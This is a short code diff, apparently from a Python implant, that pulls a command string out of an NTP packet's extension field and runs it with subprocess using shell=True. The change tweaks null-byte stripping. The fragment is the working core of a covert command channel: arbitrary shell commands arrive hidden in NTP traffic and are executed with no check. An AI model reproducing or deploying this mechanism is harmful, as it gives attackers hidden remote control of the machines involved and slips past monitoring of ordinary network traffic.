@@ -62,7 +62,7 @@ def handle_data(data):
     try: 
         exts = parse_ntp_packet(data)
         if exts:
-                command = exts[0][1].decode().strip("\x00")
+                command = exts[0][1].decode().replace("\x00", "")
                 print(f"Executing command {command}...")
                 output = subprocess.run(command, capture_output=True, shell=True)
                 print(f"Command executed with return code {output.returncode}")
